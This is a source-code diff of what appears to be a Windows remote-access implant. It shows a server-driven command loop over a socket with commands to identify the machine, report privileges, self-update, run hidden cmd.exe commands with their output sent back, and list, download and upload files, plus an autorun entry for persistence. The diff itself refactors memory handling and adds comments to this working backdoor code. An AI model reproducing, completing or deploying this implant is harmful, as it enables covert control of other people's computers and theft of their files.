@@ -17,6 +17,10 @@ __declspec(allocate(".conf")) PAYLOAD_CONFIG m_PayloadConfig =
     ""
 };
 
+// for GetMachineSpecificData()
+#define MACHINE_GUID_KEY "SOFTWARE\\Microsoft\\Cryptography"
+#define MACHINE_GUID_VAL "MachineGuid"
+
 PAYLOAD_COMMAND m_PayloadCommands[] = {
 
     { "id", CommandId },
@@ -87,6 +91,7 @@ BOOL AutorunRemove(void)
                 // delete aurorun entry
                 if (RegDeleteValue(hKey, szValueName))
                 {
+                    DbgMsg(__FUNCTION__"(): Autorun entry removed\n");
                     bRet = TRUE;
                 }
 
@@ -645,10 +650,7 @@ DWORD RemoteCommunicate(SOCKET s)
             }
         }
 
-        DbgMsg(
-            __FUNCTION__"(): Command = \"%s\", args = \"%s\"\n", 
-            lpszCommand, lpszArgs ? lpszArgs : "<NONE>"
-        );
+        DbgMsg(__FUNCTION__"(): Command = \"%s\"\n", lpszCommand);
 
         BOOL bHandled = FALSE;
         DWORD dwRet = CMD_OK;
@@ -690,6 +692,7 @@ DWORD CommandId(SOCKET s, char *lpszArgs)
 {
     DbgMsg(__FUNCTION__"()\n");
 
+    // send client ID
     if (!RemoteSend(s, "%s\n", m_szIdent))
     {
         return CMD_RESET;
@@ -736,6 +739,7 @@ DWORD CommandInfo(SOCKET s, char *lpszArgs)
             CheckForAdminUser() ? 1 : 0, GetProcessIntegrity()
         );
 
+        // send client information string
         if (RemoteSendData(s, lpszBuff))
         {
             dwRet = CMD_OK;
@@ -763,11 +767,10 @@ DWORD CommandExit(SOCKET s, char *lpszArgs)
 {
     DbgMsg(__FUNCTION__"()\n");
 
+    // tell the caller function to quit from the communication loop
     return CMD_EXIT;
 }
 //--------------------------------------------------------------------------------------
-#define UPDATE_TIMEOUT 30 // in seconds
-
 DWORD CommandUpd(SOCKET s, char *lpszArgs)
 {
     if (lpszArgs == NULL)
@@ -775,14 +778,17 @@ DWORD CommandUpd(SOCKET s, char *lpszArgs)
         return CMD_RESET;
     }
 
-    DbgMsg(__FUNCTION__"(): %s\n", lpszArgs);
+    DbgMsg(__FUNCTION__"()\n");
 
+    // remove currently present autorun entry
     AutorunRemove();
 
+    // disconnect from the server
     closesocket(s);
 
     if (m_hMutex)
     {
+        // remove unique client mutex
         CloseHandle(m_hMutex);
         m_hMutex = NULL;
     }
@@ -795,6 +801,7 @@ DWORD CommandUpd(SOCKET s, char *lpszArgs)
     StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
     StartupInfo.wShowWindow = FALSE;
     
+    // start the new client
     if (CreateProcess(NULL, lpszArgs, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcessInfo))
     {
         DWORD dwExitCode = -1;
@@ -828,6 +835,7 @@ _end:
         DbgMsg("CreateProcess() ERROR %d\n", GetLastError());
     }
 
+    // create unique client mutex again in case of failure
     if (m_hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME))
     {
         if (GetLastError() == ERROR_ALREADY_EXISTS)
@@ -845,18 +853,18 @@ DWORD CommandUninst(SOCKET s, char *lpszArgs)
 {
     DbgMsg(__FUNCTION__"()\n");
 
+    // remove currently present autorun entry
     AutorunRemove();
 
+    // tell the caller function to quit from the communication loop
     return CMD_EXIT;
 }
 //--------------------------------------------------------------------------------------
-#define COMMAND_BUFF_SIZE 0x100
-
 DWORD CommandExec(SOCKET s, char *lpszArgs)
 {
     DWORD dwRet = CMD_OK;
-
-    DbgMsg(__FUNCTION__"()\n");
+    PWSTR lpszCmd = NULL, lpszCmdLine = NULL;
+    PUCHAR Buff = NULL;
 
     SECURITY_ATTRIBUTES SecAttr;
     SecAttr.lpSecurityDescriptor = NULL;
@@ -865,38 +873,41 @@ DWORD CommandExec(SOCKET s, char *lpszArgs)
 
     DWORD dwExitCode = -1;
     HANDLE hConsoleInput = NULL, hInput = NULL;
-    HANDLE hConsoleOutput = NULL, hOutput = NULL;
+    HANDLE hConsoleOutput = NULL, hOutput = NULL;    
 
     if (lpszArgs == NULL)
     {
         goto _end;
     }
 
-    //
-    // Create pipes for Windows console input and output.
-    //
+    DbgMsg(__FUNCTION__"()\n");
 
+    // allocate I/O buffer
+    if ((Buff = (PUCHAR)M_ALLOC(PAGE_SIZE)) == NULL)
+    {
+        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
+        goto _end;
+    }
+
+    // create console input pipe
     if (!CreatePipe(&hConsoleInput, &hInput, &SecAttr, 0))
     {
         DbgMsg("CreatePipe() ERROR %d\n", GetLastError());
         goto _end;
     }
 
+    // create console output pipe
     if (!CreatePipe(&hOutput, &hConsoleOutput, &SecAttr, 0))
     {
         DbgMsg("CreatePipe() ERROR %d\n", GetLastError());
         goto _end;
     }
 
-    //
-    // Run the command shell process.
-    //
-
     PROCESS_INFORMATION ProcessInfo;
     ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
 
-    STARTUPINFO StartupInfo;
-    GetStartupInfo(&StartupInfo);
+    STARTUPINFOW StartupInfo;
+    GetStartupInfoW(&StartupInfo);
     StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
     StartupInfo.wShowWindow = FALSE;
     StartupInfo.hStdError = StartupInfo.hStdOutput = hConsoleOutput;
@@ -913,14 +924,42 @@ DWORD CommandExec(SOCKET s, char *lpszArgs)
         */
         bUnicode = TRUE;
     }
-    
-    UINT CodePage = bUnicode ? 65001 : 0;
-    char szCmdLine[MAX_PATH];
 
-    // UTF-8 support on NT 5.x is broken, so, by default we enabling it only on NT 6.x
-    wsprintf(szCmdLine, "cmd.exe /C \"%s%s\"", bUnicode ? "chcp 65001 > NUL & " : "", lpszArgs);
+    UINT CodePage = bUnicode ? 65001 : 0;  
 
-    if (!CreateProcess(NULL, szCmdLine, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &StartupInfo, &ProcessInfo))
+    // get UTF-16 string length
+    int CmdLen = MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, NULL, 0);
+    if (CmdLen == 0)
+    {
+        DbgMsg("MultiByteToWideChar() ERROR %d\n", GetLastError());
+        goto _end;
+    }
+
+    // calculate an actual amount of needed memory
+    DWORD dwCmdSize = (CmdLen + 1) * sizeof(WCHAR);
+
+    // allocate memory for the command to execute
+    if ((lpszCmd = (PWSTR)M_ALLOC(dwCmdSize)) == NULL)
+    {
+        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
+        goto _end;
+    }
+
+    // convert command string from UTF-8 to UTF-16
+    ZeroMemory(lpszCmd, dwCmdSize);
+    MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, lpszCmd, CmdLen);
+
+    // allocate memory for the process command line
+    if ((lpszCmdLine = (PWSTR)M_ALLOC(dwCmdSize + (MAX_PATH * sizeof(WCHAR)))) == NULL)
+    {
+        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
+        goto _end;
+    }    
+
+    wsprintfW(lpszCmdLine, L"cmd.exe /C \"%s%s\"", bUnicode ? L"chcp 65001 > NUL & " : L"", lpszCmd);
+
+    // run the command shell process
+    if (!CreateProcessW(NULL, lpszCmdLine, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &StartupInfo, &ProcessInfo))
     {
         DbgMsg("CreateProcess() ERROR %d\n", GetLastError());
         goto _end;
@@ -941,20 +980,15 @@ DWORD CommandExec(SOCKET s, char *lpszArgs)
     }    
 
     DbgMsg(
-        __FUNCTION__"(): Shell process %d started: \"%s\", code page: %d\n", 
-        ProcessInfo.dwProcessId, szCmdLine, CodePage
+        __FUNCTION__"(): Shell process %d started, code page: %d\n", 
+        ProcessInfo.dwProcessId, CodePage
     );
-
-    //
-    // Read process standard output and return it to the engine.
-    //        
 
     DWORD dwTime = GetTickCount();
 
     while (true)
     { 
-        DWORD dwReaded = 0, dwBytesAvailable = 0;
-        UCHAR Buff[COMMAND_BUFF_SIZE];
+        DWORD dwReaded = 0, dwBytesAvailable = 0;        
 
         // check if there is any data in the pipe to read
         if (!PeekNamedPipe(hOutput, NULL, NULL, NULL, &dwBytesAvailable, NULL))
@@ -989,7 +1023,8 @@ DWORD CommandExec(SOCKET s, char *lpszArgs)
             continue; 
         }        
 
-        if (!ReadFile(hOutput, Buff, min(sizeof(Buff), dwBytesAvailable), &dwReaded, NULL))
+        // read process stdout
+        if (!ReadFile(hOutput, Buff, min(PAGE_SIZE, dwBytesAvailable), &dwReaded, NULL))
         {
             DbgMsg("ReadFile() ERROR %d\n", GetLastError());
             break;
@@ -1005,11 +1040,13 @@ DWORD CommandExec(SOCKET s, char *lpszArgs)
             int DataLen = MultiByteToWideChar(CodePage, 0, (LPCSTR)Buff, dwReaded, NULL, 0);
             if (DataLen > 0)
             {
-                DWORD dwBuffLen = DataLen * sizeof(WCHAR);
-                PWSTR lpszBuff = (PWSTR)M_ALLOC(dwBuffLen + sizeof(WCHAR));
+                // calculate an actual amount of needed memory
+                DWORD dwBuffLen = (DataLen + 1) * sizeof(WCHAR);
+                PWSTR lpszBuff = (PWSTR)M_ALLOC(dwBuffLen);
                 if (lpszBuff)
                 {
-                    ZeroMemory(lpszBuff, dwBuffLen + sizeof(WCHAR));
+                    // convert command soutput from console code page to UTF-16
+                    ZeroMemory(lpszBuff, dwBuffLen);
                     MultiByteToWideChar(CodePage, 0, (LPCSTR)Buff, dwReaded, lpszBuff, DataLen);
 
                     if (!RemoteSendData(s, lpszBuff))
@@ -1034,7 +1071,7 @@ DWORD CommandExec(SOCKET s, char *lpszArgs)
         }
         else
         {
-            // unknown code page, pass the raw UTF-8 data.
+            // unknown code page, pass raw data
             if (!RemoteSendData(s, (char *)Buff, dwReaded))
             {
                 dwRet = CMD_RESET;
@@ -1095,6 +1132,21 @@ _end:
         CloseHandle(hConsoleInput);
     }
 
+    if (lpszCmdLine)
+    {
+        M_FREE(lpszCmdLine);
+    }
+
+    if (lpszCmd)
+    {
+        M_FREE(lpszCmd);
+    }
+
+    if (Buff)
+    {
+        M_FREE(Buff);
+    }
+
     if (!RemoteSend(s, "{{{#%.8x}}}\n", dwExitCode))
     {
         dwRet = CMD_RESET;
@@ -1107,15 +1159,18 @@ DWORD CommandShell(SOCKET s, char *lpszArgs)
 {
     DbgMsg(__FUNCTION__"()\n");
 
-    // ...
+    // interactive shell command is not implemented yet
 
     return CMD_RESET;
 }
 //--------------------------------------------------------------------------------------
 DWORD CommandFileList(SOCKET s, char *lpszArgs)
 {
-    DWORD dwExitCode = -1, dwRet = CMD_OK;    
-    WIN32_FIND_DATAW FindData;    
+    DWORD dwExitCode = -1, dwRet = CMD_OK;        
+    PWSTR lpszPath = NULL;
+    WIN32_FIND_DATAW FindData;
+
+    DbgMsg(__FUNCTION__"()\n");
 
     if (lpszArgs == NULL)
     {        
@@ -1159,22 +1214,31 @@ DWORD CommandFileList(SOCKET s, char *lpszArgs)
         goto _end;
     }    
 
-    PWSTR lpszPath = (PWSTR)M_ALLOC(PAGE_SIZE);
-    if (lpszPath == NULL)
+    // get UTF-16 string length
+    int PathLen = MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, NULL, 0);
+    if (PathLen == 0)
+    {
+        DbgMsg("MultiByteToWideChar() ERROR %d\n", GetLastError());
+        goto _end;
+    }
+
+    // calculate an actual amount of needed memory
+    DWORD dwPathSize = (PathLen + 3) * sizeof(WCHAR);
+
+    // allocate memory for file path
+    if ((lpszPath = (PWSTR)M_ALLOC(dwPathSize)) == NULL)
     {
         DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
         goto _end;
     }
 
-    ZeroMemory(lpszPath, PAGE_SIZE);
-    MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, lpszPath, (PAGE_SIZE / sizeof(WCHAR)) - 3);    
+    // convert file path from UTF-8 to UTF-16
+    ZeroMemory(lpszPath, dwPathSize);
+    MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, lpszPath, PathLen);        
 
-    DbgMsg(__FUNCTION__"(): \"%ws\"\n", lpszPath);
-
-    size_t PathLen = wcslen(lpszPath);
-
-    if (PathLen > 0 && (lpszPath[PathLen - 1] == L'\\' || lpszPath[PathLen - 1] == L'/'))
+    if (lpszPath[PathLen - 1] == L'\\' || lpszPath[PathLen - 1] == L'/')
     {
+        // remove ending slash
         lpszPath[PathLen - 1] = L'\0';
     }
 
@@ -1221,11 +1285,14 @@ DWORD CommandFileList(SOCKET s, char *lpszArgs)
     else
     {
         DbgMsg("FindFirstFile() ERROR %d\n", GetLastError());
-    }
-
-    M_FREE(lpszPath);
+    }    
 
 _end:
+
+    if (lpszPath)
+    {
+        M_FREE(lpszPath);
+    }
 
     if (!RemoteSend(s, "{{{#%.8x}}}\n", dwExitCode))
     {
@@ -1238,23 +1305,44 @@ _end:
 DWORD CommandFileGet(SOCKET s, char *lpszArgs)
 {
     DWORD dwRet = CMD_RESET;
+    PWSTR lpszPath = NULL;
+    PUCHAR Buff = NULL;
 
     if (lpszArgs == NULL)
     {
         return dwRet;
     }
 
-    PWSTR lpszPath = (PWSTR)M_ALLOC(PAGE_SIZE);
-    if (lpszPath == NULL)
+    DbgMsg(__FUNCTION__"()\n");
+
+    // allocate I/O buffer
+    if ((Buff = (PUCHAR)M_ALLOC(PAGE_SIZE)) == NULL)
     {
         DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
-        return dwRet;
+        goto _end;
     }
 
-    ZeroMemory(lpszPath, PAGE_SIZE);
-    MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, lpszPath, (PAGE_SIZE / sizeof(WCHAR)) - 1);
+    // get UTF-16 string length
+    int PathLen = MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, NULL, 0);
+    if (PathLen == 0)
+    {
+        DbgMsg("MultiByteToWideChar() ERROR %d\n", GetLastError());
+        goto _end;
+    }
 
-    DbgMsg(__FUNCTION__"(): \"%ws\"\n", lpszPath);
+    // calculate an actual amount of needed memory
+    DWORD dwPathSize = (PathLen + 1) * sizeof(WCHAR);
+
+    // allocate memory for file path
+    if ((lpszPath = (PWSTR)M_ALLOC(dwPathSize)) == NULL)
+    {
+        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
+        goto _end;
+    }
+
+    // convert file path from UTF-8 to UTF-16
+    ZeroMemory(lpszPath, dwPathSize);
+    MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, lpszPath, PathLen);
 
     ULARGE_INTEGER Size;
     Size.QuadPart = -1;    
@@ -1283,7 +1371,6 @@ DWORD CommandFileGet(SOCKET s, char *lpszArgs)
 
         while (dwSent < Size.QuadPart)
         {
-            PUCHAR Buff = (PUCHAR)lpszPath;
             DWORD dwReaded = 0;
 
             if (!ReadFile(hFile, Buff, min(PAGE_SIZE, (DWORD)(Size.QuadPart - dwSent)), &dwReaded, NULL))
@@ -1315,7 +1402,15 @@ DWORD CommandFileGet(SOCKET s, char *lpszArgs)
 
 _end:
 
-    M_FREE(lpszPath);
+    if (lpszPath)
+    {
+        M_FREE(lpszPath);
+    }
+
+    if (Buff)
+    {
+        M_FREE(Buff);
+    }
 
     return dwRet;
 }
@@ -1323,23 +1418,44 @@ _end:
 DWORD CommandFilePut(SOCKET s, char *lpszArgs)
 {
     DWORD dwRet = CMD_RESET;
+    PWSTR lpszPath = NULL;
+    PUCHAR Buff = NULL;
 
     if (lpszArgs == NULL)
     {
         return dwRet;
     }
 
-    PWSTR lpszPath = (PWSTR)M_ALLOC(PAGE_SIZE);
-    if (lpszPath == NULL)
+    DbgMsg(__FUNCTION__"()\n");
+
+    // allocate I/O buffer
+    if ((Buff = (PUCHAR)M_ALLOC(PAGE_SIZE)) == NULL)
     {
         DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
-        return dwRet;
+        goto _end;
     }
 
-    ZeroMemory(lpszPath, PAGE_SIZE);
-    MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, lpszPath, (PAGE_SIZE / sizeof(WCHAR)) - 1);
+    // get UTF-16 string length
+    int PathLen = MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, NULL, 0);
+    if (PathLen == 0)
+    {
+        DbgMsg("MultiByteToWideChar() ERROR %d\n", GetLastError());
+        goto _end;
+    }
 
-    DbgMsg(__FUNCTION__"(): \"%ws\"\n", lpszPath);
+    // calculate an actual amount of needed memory
+    DWORD dwPathSize = (PathLen + 1) * sizeof(WCHAR);
+
+    // allocate memory for file path
+    if ((lpszPath = (PWSTR)M_ALLOC(dwPathSize)) == NULL)
+    {
+        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
+        goto _end;
+    }
+
+    // convert file path from UTF-8 to UTF-16
+    ZeroMemory(lpszPath, dwPathSize);
+    MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, lpszPath, PathLen);
 
     UCHAR Status = 0;
 
@@ -1373,7 +1489,6 @@ DWORD CommandFilePut(SOCKET s, char *lpszArgs)
 
         while (dwReceived < dwSize)
         {
-            PUCHAR Buff = (PUCHAR)lpszPath;
             DWORD dwReaded = min(PAGE_SIZE, (DWORD)(dwSize - dwReceived)), dwWritten = 0;
 
             if (!RemoteRecvData(s, (char *)Buff, dwReaded))
@@ -1405,14 +1520,19 @@ DWORD CommandFilePut(SOCKET s, char *lpszArgs)
 
 _end:
 
-    M_FREE(lpszPath);
+    if (lpszPath)
+    {
+        M_FREE(lpszPath);
+    }
+
+    if (Buff)
+    {
+        M_FREE(Buff);
+    }
 
     return dwRet;
 }
 //--------------------------------------------------------------------------------------
-#define MACHINE_GUID_KEY "SOFTWARE\\Microsoft\\Cryptography"
-#define MACHINE_GUID_VAL "MachineGuid"
-
 BOOL GetMachineSpecificData(char *lpszBuff, ULONG dwMaxLength)
 {
     HKEY hKey;
